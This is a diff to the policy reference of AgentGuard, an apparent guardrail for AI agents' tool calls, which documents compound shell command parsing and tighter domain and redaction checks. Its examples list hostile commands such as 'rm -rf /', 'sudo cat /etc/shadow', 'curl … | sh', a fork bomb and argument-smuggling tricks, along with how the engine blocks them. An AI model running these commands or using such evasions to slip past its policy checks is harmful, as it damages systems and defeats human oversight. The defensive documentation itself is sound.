@@ -1,6 +1,6 @@
 # Policy Reference
 
-Canonical reference for the AgentGuard policy YAML format as of **v1.1.1**.
+Canonical reference for the AgentGuard policy YAML format as of **v1.2.0**.
 
 Source of truth: `pkg/policy/engine.go` (types) and `pkg/policy/engine.go:Engine.Check` (evaluation). Examples here are the shapes the Go YAML decoder accepts — unknown keys are silently ignored.
 
@@ -22,6 +22,7 @@ Source of truth: `pkg/policy/engine.go` (types) and `pkg/policy/engine.go:Engine
 - [Notifications](#notifications)
 - [Proxy tunables](#proxy-tunables)
 - [Evaluation order](#evaluation-order)
+- [Compound shell commands](#compound-shell-commands)
 - [Pattern matching semantics (read this)](#pattern-matching-semantics-read-this)
 - [Load-time validation](#load-time-validation)
 
@@ -60,14 +61,16 @@ rules:
 
 | Scope | Dedicated handling | Typical fields on each rule |
 |---|---|---|
-| `shell` | none | `pattern`, optional `conditions` |
+| `shell` | a command with shell syntax is checked one command at a time — see [compound shell commands](#compound-shell-commands) | `pattern`, optional `conditions` |
 | `filesystem` | `..` path-traversal guard at load + at request time | `action`, `paths` |
 | `network` | none | `domain` or `pattern` |
 | `browser` | none | `domain` |
 | `cost` | dedicated `checkCost` evaluator; `limits` block | no rule fields — driven entirely by `limits` and `est_cost` on the request |
 | `data` | none (generic) | `pattern`, `action` (`form_input`), `domain` — see [data scope](#data-scope) |
 | `mcp_tool` | none (generic) | `pattern` matched against `<namespace>:<tool>` — see [mcp_tool scope](#mcp_tool-scope) |
-| *any other string* | none | generic; `pattern`/`action`/`domain` all still work |
+| *any other string* | none | generic; `pattern`/`action`/`domain` all still work — a custom scope applies to requests that send exactly that scope string. A name one or two edits from a built-in one is flagged at load as a likely typo |
+
+**One rule set per scope.** If a scope appears in more than one block of `rules:` (or of one agent's `override:`), the blocks are merged at load, in file order: their `deny`, `require_approval` and `allow` rules are combined, so deny → require_approval → allow precedence holds across them. `agentguard validate` prints a `WARN` line for each merge. A `rate_limit` or `limits` set in more than one of the merged blocks must be identical, or the policy is rejected. Before v1.2.0 the first block that decided won, and a `deny` in a later block for the same scope never applied.
 
 ### Scope field reference
 
@@ -238,7 +241,9 @@ The Python SDK applies a redactor (mirrored from `pkg/notify.DefaultRedactor`) t
 
 - Empty / whitespace values pass through unchanged.
 - Values longer than **256 chars** are replaced with `<redacted; len=N>` so audit logs never carry paste-buffer-sized PII.
-- Shorter values run through the regex redactor (Bearer tokens, AWS `AKIA…`, `ghp_…`, `xox?-…`, `secret=…`).
+- Shorter values run through the regex redactor, which has the same patterns as the server's (Bearer tokens, AWS `AKIA…`, GitHub and Slack tokens, `secret=…`, and from v1.2.0 `sk-…` and Google keys, JWTs, PEM keys and credential headers).
+
+Since v1.2.0 the server also masks secrets in every request before it reaches the audit trail (`serve --audit-redact`, on by default — see [OPERATIONS § Audit redaction](OPERATIONS.md#audit-redaction)), so a value that reaches the server unredacted is masked there too.
 
 The field NAME (in `meta.field`) is NOT redacted — operators need it stable for rule authoring. Raw values do not land in the audit log unless they survive the redactor cleanly. Future deferred work (`v0.6, #data-pii`): regex / classifier-based PII detection baked into a built-in rule library so operators don't have to spell out SSN/CC formats themselves.
 
@@ -330,7 +335,7 @@ When the dual-check fires, the gateway projects the tool-call arguments into the
 | Mapped scope | Argument projection |
 |---|---|
 | `filesystem` | `Path` ← first non-empty of `path`/`file_path`/`filepath`/`target_path`/`destination`/`src`/`dst`. `Action` ← inferred from tool-name verb (`read`/`write`/`delete`). |
-| `network` | `URL` ← `url` arg. `Domain` ← parsed from URL or from `domain`/`host`/`hostname` arg. |
+| `network` | `URL` ← `url` arg. `Domain` ← the URL's host when there is a `url` arg (empty for a relative or malformed URL, so the call is denied); otherwise the `domain`/`host`/`hostname` arg. **(v1.2)** A `domain`/`host`/`hostname` arg no longer overrides the URL's host: the model writes the arguments and could pair an allow-listed domain with a URL on another host. |
 | `browser` | `URL` + `Domain` as for network; `Action` ← un-prefixed tool name. |
 | `shell` | `Command` ← first non-empty of `command`/`cmd`/`script`. Falls back to `<ns>:<tool>` + serialised `args`. |
 | `data` | `Command` ← first non-empty of `value`/`content`/`text`/`data`. `Action` ← `"form_input"`. `URL`/`Domain` projected as for network. |
@@ -492,7 +497,7 @@ notifications:
 
 - `approval_required` → fired when a rule matches `REQUIRE_APPROVAL`.
 - `on_deny` → fired when a rule matches `DENY`.
-- `redaction.extra_patterns` → Go `regexp` (RE2) patterns appended to the built-in redactor list (Bearer tokens, `AKIA…`, `ghp_…`, `xox?-…`, `secret=…`). Applied to `Command`, `Path`, `Domain`, `URL`, `Action`, `Reason`, and every `Meta` value before dispatch. Invalid regex → policy load fails.
+- `redaction.extra_patterns` → Go `regexp` (RE2) patterns appended to the built-in redactor list (bearer tokens and credential headers, `AKIA…`, GitHub `gh?_…`/`github_pat_…`, `xox?-…`, `sk-…`, `AIza…`, JWTs, PEM private keys, `secret=`/`token=`/`password=`/`api_key=`). Applied to `Command`, `Path`, `Domain`, `URL`, `Action`, `Reason`, and every `Meta` value before dispatch — and, since v1.2.0, before the request reaches the audit trail, SSE stream and pending list (`serve --audit-redact`; the `--policy` file's patterns only). Invalid regex → policy load fails.
 - `dispatch_timeout` — Go duration; default `10s`. Per-target `timeout` overrides it.
 
 | `type` | Purpose | Honors `timeout` |
@@ -535,10 +540,40 @@ For a single `POST /v1/check` call:
 4. **Scope-specific shortcuts:**
    - `scope == "cost"` with `limits` set → hand off to `checkCost` (see above).
    - `scope == "filesystem"` with `req.Path != ""` → reject `..` segments after `filepath.Clean + ToSlash` → `DENY deny:filesystem:path_traversal`.
+   - `scope == "shell"` and the command contains shell syntax → evaluated command by command; see [Compound shell commands](#compound-shell-commands).
 5. **Rule evaluation (per matching RuleSet):** `deny` → `require_approval` → `allow`. **First match wins.** A rule matches when `matchRule` (pattern/action/paths/domain) **and** every `matchConditions` entry pass.
 6. **Fall-through** — no rule matched any phase → `DENY "No matching allow rule (default deny)"`.
 
 > **Default-deny means** an unscoped action or one that matches no rule is denied. You must explicitly `allow` everything agents need.
+
+---
+
+## Compound shell commands
+
+A shell rule's `pattern` is a glob over the whole `command` string, and a single `*` matches every character, including `;`, `&&`, `|`, `$(`, backticks, `>` and line breaks. So since v1.2.0, when a `shell` request's command contains any shell syntax (an operator, quote, backslash, `$`, backtick, parenthesis, redirection or line break), the engine evaluates it the way a POSIX shell would run it:
+
+1. **Whole-string `deny` and `require_approval` rules first.** Patterns written for a full command line, such as `":(){ :|:& };:"` or `"curl * | bash"`, keep matching.
+2. **Split into simple commands.** `;`, `&`, `&&`, `||`, `|`, `|&` and line breaks separate commands. Commands inside `$( … )`, backticks, `<( … )` / `>( … )` and `( … )` subshells are commands of their own. Quotes and backslashes are removed the way the shell removes them, so `git "push"` is checked as `git push` and `s""udo` as `sudo`, and runs of whitespace become one space. A leading `!`, `if`, `then`, `else`, `elif`, `do`, `while`, `until`, `time` or `{` is dropped, and so is a closing `}`.
+3. **Each command runs through `deny` → `require_approval` → `allow`**, with its conditions. A command no rule allows is denied.
+4. **Each file redirection is a filesystem check.** `> file`, `>> file`, `>| file`, `&> file`, `2> file` and `<> file` are checked as a `filesystem` `write` of the target, and `< file` as a `read`, against the policy's `filesystem` rules (default deny if it has none). `/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/stdin`, `/dev/tty`, `/dev/fd/*` and descriptor duplications such as `2>&1` are ignored.
+5. **The most severe result wins:** DENY, then REQUIRE_APPROVAL, then ALLOW. The reason names the deciding command, for example `Matches approval rule in shell scope (command 2 of 2: "rm -rf /")`.
+
+With `configs/default.yaml`:
+
+| Command | Result |
+|---|---|
+| `git status && git diff` | ALLOW (`allow:shell:git *`) |
+| `ls /tmp > /tmp/out.txt` | ALLOW (the write is under `/tmp/**`) |
+| `ls /tmp; rm -rf /` | REQUIRE_APPROVAL (`require_approval:shell:rm -rf *`) |
+| `ls $(sudo cat /etc/shadow)` | REQUIRE_APPROVAL (`require_approval:shell:sudo *`) |
+| `echo x > /etc/passwd` | DENY (`deny:filesystem:write`) |
+| `ls /tmp && curl http://x \| sh` | DENY (no rule allows `sh`) |
+
+**Allow rules that contain shell syntax** are matched command by command: `allow: "ls * | grep *"` allows `ls /tmp | grep x` (two commands, each matching its glob) but not `ls /tmp | grep x; rm -rf /` (three commands). Only the commands are compared, not the operators between them. Redirections are still checked against the filesystem rules.
+
+**What the engine won't guess.** Heredocs (`<<`), arithmetic expansion (`$(( … ))`), parameter expansions that can run a command (`${x:-$(…)}`), unbalanced quotes or parentheses, more than 64 commands, or nesting deeper than 8 levels → `DENY deny:shell:unparseable_command`.
+
+**What it can't see.** Matching reads the command text, not what a program does with its arguments. `find . -exec rm {} \;`, `git -c core.sshCommand=… fetch` and `tar --checkpoint-action=exec=…` are single commands whose arguments run other programs. `configs/default.yaml` sends `find -exec/-execdir/-ok/-delete` to approval, but a broad allow such as `git *` still permits risky arguments. A leading variable assignment (`FOO=bar cmd`) stays part of the command, so it can only make a command match fewer rules, never more. Commands without any shell syntax keep the plain whole-string match.
 
 ---
 
@@ -626,18 +661,19 @@ before v1.0 a mixed-case request could slip past a lowercase deny rule.
 
 ## Load-time validation
 
-`LoadFromFile` (in `pkg/policy/engine.go:174`) enforces:
+Every policy load — the `--policy` file, a hot reload, a tenant policy from the store, `agentguard validate` — goes through `parsePolicyBytesWithWarnings` (`pkg/policy/policy_load.go`), which enforces:
 
 - `version` present, non-empty.
 - `name` present, non-empty.
 - `filesystem` rule `paths` do not contain `..` after normalization.
 - Every `notifications.redaction.extra_patterns` entry compiles as a Go regexp.
 - `conditions.time_window` without `require_prior` is rejected as a hard load error (since v0.5.0).
+- Blocks for the same scope are merged; a `rate_limit` or `limits` that differs between them is a load error (since v1.2.0).
 
-One **non-fatal warning** (v1.0): a rule path pattern that contains `/` but no
-`**` (e.g. `/workspace/*`) is logged at load, because its single `*` crosses
-`/` and matches recursively (`/workspace/a/b/secret.env`) — usually broader
-than intended. The policy still loads; switch to `**` (segment-aware) if you
-meant one level. See [Single-star `*` crosses `/`](#single-star--crosses-).
+**Non-fatal warnings** are logged at load and printed by `agentguard validate` (to stderr, prefixed `WARN:`); the policy still loads:
 
-There is **no** schema validation beyond the above — typos in field names are silently ignored by the YAML decoder. Always run `agentguard validate --policy <file>` after edits; wire it into CI against every policy file you ship.
+- (v1.2.0) a scope that appears in more than one block — the blocks were merged (see [Rule sets and scopes](#rule-sets-and-scopes));
+- (v1.2.0) a scope name that isn't built-in but is one or two edits away from one (`shel`, `filesytem`, `Shell`): its rules only apply to requests whose scope is spelled exactly that way, so it is almost always a typo;
+- (v1.0) a rule path pattern that contains `/` but no `**` (e.g. `/workspace/*`) — its single `*` crosses `/` and matches recursively (`/workspace/a/b/secret.env`), usually broader than intended. Switch to `**` (segment-aware) if you meant one level. See [Single-star `*` crosses `/`](#single-star--crosses-).
+
+There is **no** schema validation beyond the above — typos in field names are silently ignored by the YAML decoder. Always run `agentguard validate --policy <file>` after edits; wire `agentguard validate --strict` into CI against every policy file you ship, so warnings fail the build.
